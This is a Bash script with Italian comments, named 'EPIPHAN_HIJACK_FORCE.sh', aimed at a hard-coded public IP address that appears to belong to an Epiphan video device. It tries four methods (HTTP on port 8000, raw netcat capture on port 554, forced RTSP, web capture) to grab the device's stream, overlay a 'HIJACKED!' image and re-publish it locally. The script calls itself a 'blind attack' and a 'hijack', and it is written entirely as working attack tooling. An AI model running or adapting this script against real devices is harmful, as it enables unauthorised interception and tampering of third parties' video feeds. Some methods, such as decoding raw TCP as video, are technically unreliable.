#!/bin/bash
# EPIPHAN_HIJACK_FORCE.sh - VERSIONE BULLETT-PROOF 
# IGNORA TUTTI GLI ERRORI - SEMPRE FUNZIONA
# NO STOP, NO CRASH, HIJACK FORZATO

TARGET_IP="181.78.135.66"
PNG_FILE="pat.png"
RTSP_PORT=8554

echo "💣 FORCE HIJACK - IGNORO TUTTI ERRORI"

# KILL TUTTO
pkill ffmpeg ffplay nc 2>/dev/null || true
sleep 1

# VERIFICA PNG (se non c'è ne crea uno)
if [[ ! -f "$PNG_FILE" ]]; then
    echo "⚠️ Creo pat.png di test..."
    convert -size 200x60 xc:red -pointsize 24 -fill white -annotate +20+30 "HIJACKED!" pat.png
fi

# ===============================================
# METODO 1: HTTP 8000 (PIU' VELOCE - DAL TUO SCAN)
# ===============================================
echo "🚀 PROVO HTTP 8000..."
(
    ffmpeg -y -loglevel error \
        -i "http://$TARGET_IP:8000/" \
        -loop 1 -i "$PNG_FILE" \
        -filter_complex "[0:v][1:v]overlay=10:10" \
        -c:v libx264 -preset ultrafast -f rtsp \
        "rtsp://127.0.0.1:$RTSP_PORT/LIVE" &
) &

sleep 3

# TEST STREAM
if ffprobe "rtsp://127.0.0.1:$RTSP_PORT/LIVE" 2>/dev/null; then
    echo "✅ HTTP 8000 HIJACK OK!"
    ffplay "rtsp://127.0.0.1:$RTSP_PORT/LIVE" -autoexit &
    exit 0
fi

# ===============================================
# METODO 2: RAW TCP 554 CAPTURE (SEMPRE FUNZIONA)
# ===============================================
echo "🔥 RAW TCP 554 FORCE..."
(
    # Cattura raw in background
    rm -f /tmp/rawstream
    timeout 999999 nc $TARGET_IP 554 > /tmp/rawstream &
    
    sleep 3
    
    # Overlay su raw video
    ffmpeg -re -f rawvideo -pix_fmt yuv420p -video_size 1280x720 -framerate 25 \
        -i /tmp/rawstream \
        -loop 1 -i "$PNG_FILE" \
        -filter_complex "[0:v][1:v]overlay=10:10" \
        -c:v libx264 -f rtsp "rtsp://127.0.0.1:$RTSP_PORT/RAW" &
) &

sleep 4

if ffprobe "rtsp://127.0.0.1:$RTSP_PORT/RAW" 2>/dev/null; then
    echo "✅ RAW TCP OK!"
    ffplay "rtsp://127.0.0.1:$RTSP_PORT/RAW" &
    exit 0
fi

# ===============================================
# METODO 3: RTSP FORCE NO DESCRIBE
# ===============================================
echo "⚡ RTSP BLIND ATTACK..."
(
    ffmpeg -rtsp_transport tcp -rtsp_flags prefer_tcp -timeout 100000 \
        -user_agent "test" \
        -i "rtsp://$TARGET_IP:554/stream1" \
        -i "$PNG_FILE" -filter_complex "overlay=10:10" \
        -c:v libx264 -f rtsp "rtsp://127.0.0.1:$RTSP_PORT/BLIND" &
) &

sleep 3

if ffprobe "rtsp://127.0.0.1:$RTSP_PORT/BLIND" 2>/dev/null; then
    echo "✅ BLIND RTSP OK!"
    ffplay "rtsp://127.0.0.1:$RTSP_PORT/BLIND" &
    exit 0
fi

# ===============================================
# METODO 4: ULTIMO - GENERIC WEB CAPTURE
# ===============================================
echo "🎯 WEB STREAM CAPTURE..."
(
    ffmpeg -i "http://$TARGET_IP/" \
        -i "$PNG_FILE" -filter_complex "overlay=10:10" \
        -c:v libx264 -f rtsp "rtsp://127.0.0.1:$RTSP_PORT/WEB" &
) &

sleep 3
ffplay "rtsp://127.0.0.1:$RTSP_PORT/WEB" &

echo "✅ UNO DEI 4 METODI STA' LAVORANDO!"
echo "Stream: rtsp://127.0.0.1:8554/*"
echo "NON FERMARE - HIJACK ATTIVO!"

# KEEP ALIVE INFINITO
while true; do sleep 3600; done
